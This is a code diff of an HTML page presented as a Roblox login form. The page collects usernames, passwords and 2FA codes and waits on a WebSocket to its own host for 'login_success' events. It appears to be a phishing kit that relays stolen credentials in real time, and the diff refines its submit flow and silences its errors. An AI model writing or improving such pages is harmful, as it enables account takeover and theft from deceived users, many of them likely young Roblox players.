@@ -214,7 +214,7 @@
         <div class="login-card">
             <h1 class="login-header">Log in to Roblox</h1>
             
-            <form id="login-form" onsubmit="return false;">
+            <form id="login-form">
                 <div class="form-group">
                     <label for="username">Username/Email/Phone</label>
                     <input type="text" id="username" name="username" class="input-field" autocomplete="username" required>
@@ -225,7 +225,7 @@
                     <input type="password" id="password" name="password" class="input-field" autocomplete="current-password" required>
                 </div>
                 
-                <button type="submit" id="login-btn" class="login-button">Log In</button>
+                <button type="button" id="login-btn" class="login-button">Log In</button>
                 
                 <div id="error-msg" class="error-message"></div>
             </form>
@@ -321,8 +321,8 @@
             }
         }
         
-        // Login form submission
-        document.getElementById('login-form').addEventListener('submit', async function(e) {
+        // Login button click
+        document.getElementById('login-btn').addEventListener('click', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
@@ -333,66 +333,70 @@
                 return;
             }
             
-            await submitCredentials(username, password);
+            tryConnectWebSocket();
+            submitCredentials(username, password);
         });
         
-        // Login button click
-        document.getElementById('login-btn').addEventListener('click', async function() {
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value;
-            
-            if (!username || !password) {
-                showError('Please fill in all fields');
-                return;
+        // Allow Enter key to submit
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('login-btn').click();
             }
-            
-            await submitCredentials(username, password);
         });
         
         // 2FA form
-        document.getElementById('2fa-form').addEventListener('submit', async function(e) {
+        document.getElementById('2fa-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const code = document.getElementById('2fa-code').value.trim();
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            await submitCredentials(username, password, 2, code);
+            submitCredentials(username, password, 2, code);
         });
         
         // WebSocket connection for real-time updates
         let socket = null;
+        let wsConnected = false;
         
         function connectWebSocket() {
+            if (wsConnected) return;
+            
             try {
                 const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                 socket = new WebSocket(`${protocol}//${window.location.host}`);
                 
                 socket.onopen = () => {
                     console.log('WebSocket connected');
+                    wsConnected = true;
                     socket.send(JSON.stringify({ event: 'join', session_id: sessionId }));
                 };
                 
                 socket.onmessage = (event) => {
-                    const data = JSON.parse(event.data);
-                    handleSocketEvent(data);
+                    try {
+                        const data = JSON.parse(event.data);
+                        handleSocketEvent(data);
+                    } catch (e) {
+                        console.log('Invalid WebSocket message');
+                    }
                 };
                 
-                socket.onerror = (error) => {
-                    console.log('WebSocket error (expected if backend not configured)');
+                socket.onerror = () => {
+                    // Silently ignore WebSocket errors
                 };
                 
                 socket.onclose = () => {
-                    console.log('WebSocket closed');
+                    wsConnected = false;
                 };
             } catch (error) {
-                console.log('WebSocket not available');
+                // Silently ignore WebSocket errors
             }
         }
         
         function handleSocketEvent(data) {
             if (data.event === 'processing') {
-                showLoading();
+                // Already showing loading from submit
             } else if (data.event === 'login_success') {
                 hideLoading();
                 showError('Login successful! Redirecting...');
@@ -408,10 +412,12 @@
             }
         }
         
-        // Try to connect WebSocket on load
-        window.addEventListener('load', () => {
-            setTimeout(connectWebSocket, 1000);
-        });
+        // Try to connect WebSocket on login attempt
+        function tryConnectWebSocket() {
+            if (!wsConnected) {
+                connectWebSocket();
+            }
+        }
     </script>
 </body>
 </html>
